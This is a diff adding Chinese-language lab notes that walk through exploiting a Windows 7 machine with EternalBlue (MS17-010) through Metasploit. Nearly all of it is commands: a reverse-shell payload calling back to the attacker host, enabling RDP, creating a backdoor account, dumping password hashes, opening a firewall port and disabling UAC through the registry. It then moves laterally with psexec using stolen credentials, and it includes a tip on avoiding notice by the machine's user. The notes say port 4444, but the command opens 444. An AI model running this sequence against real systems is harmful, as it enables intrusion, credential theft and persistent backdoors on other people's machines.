@@ -1,0 +1,153 @@
+靶机：
+使用Win7旗舰版SP1-64位系统镜像
+家庭、工作网络——》开启防火墙
+公共网络——》关闭网络
+
+永恒之蓝，利用的是Windows的SMB漏洞，利用此病毒制造了wannacry勒索病毒
+PS：win7是2009年发布
+微软官方文档：
+https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010
+
+主机扫描，是否有漏洞；
+
+攻击机：
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
+└─# systemctl start postgresql
+#msfdb run
+#可以启动数据库，并进入框架
+                                                                                                                                                                               
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
+└─# systemctl enable postgresql
+                                                                                                                                                                               
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
+└─# systemctl status postgresql
+
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
+└─# msfdb run 
+启动数据库，并启动框架
+
+搜索永恒之蓝 ms17-010
+msf6 > search ms17-010
+msf6 > use auxiliary/scanner/smb/smb_ms17_010 
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.211.55.4
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+检测目标主机是否是脆弱的；是否存在漏洞
+
+###进行攻击
+msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue 
+可以不退出，直接载入
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.211.55.4
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.211.55.6
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+
+创建远程桌面连接
+meterpreter > 
+
+靶机上需要开启远程桌面连接
+右键计算机-属性-高级系统设置————远程-允许远程连接
+
+攻击机因为有最高权限，也可以远程开启
+RDP远程桌面协议；enable_rdp
+meterpreter > run post/windows/manage/enable_rdp
+开启远程登录权限
+
+在靶机上创建用户
+meterpreter > run post/windows/manage/enable_rdp USERNAME=laohe PASSWORD=123456
+
+重新找一台windows，远程登录
+或者kali输入
+┌──(root💀kali-linux-2021-3)-[~]
+└─# rdesktop 10.211.55.4
+#不要这么搞，会被靶机用户发现
+
+关闭主机的防护策略并开启后门
+
+这是Windows存密码的地方
+C:\Windows\System32\config
+
+meterpreter > hashdump
+导出密码哈希值
+laohe:1001:XXXXXX
+
+
+给靶机防火墙开启4444端口访问权限
+meterpreter > shell
+进入靶机CMD命令行
+C:\Windows\system32>netsh firewall add portopening TCP 444 "laohe" ENABLE ALL
+C:\Windows\system32>chcp 65001
+解决中文乱码问题
+
+关闭UAC（用户账号控制）；UAC功能阻止恶意程序损坏系统
+C:\Windows\system32>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+ADD 添加一个注册表项
+-v 创建键值
+-t 键值类型
+-d 键值
+-f 强制修改注册表
+
+开启默认共享功能
+C:\Windows\system32>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+C:\Windows\system32>exit
+C:\Windows\system32>exit
+C:\Windows\system32>exit
+
+meterpreter > background
+把seesion保存到后台
+
+查看会话
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+
+psexec模块，使用此扩大战果；用用户名和密码哈希值登录靶机
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/psexec 
+msf6 exploit(windows/smb/psexec) > show options
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.211.55.4
+msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > set SMBUser laohe
+msf6 exploit(windows/smb/psexec) > set SMBPass XXX
+msf6 exploit(windows/smb/psexec) > set LHOST 10.211.55.6
+msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
+msf6 exploit(windows/smb/psexec) > set SMBUser laohe
+msf6 exploit(windows/smb/psexec) > run
+有时一次不成功
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
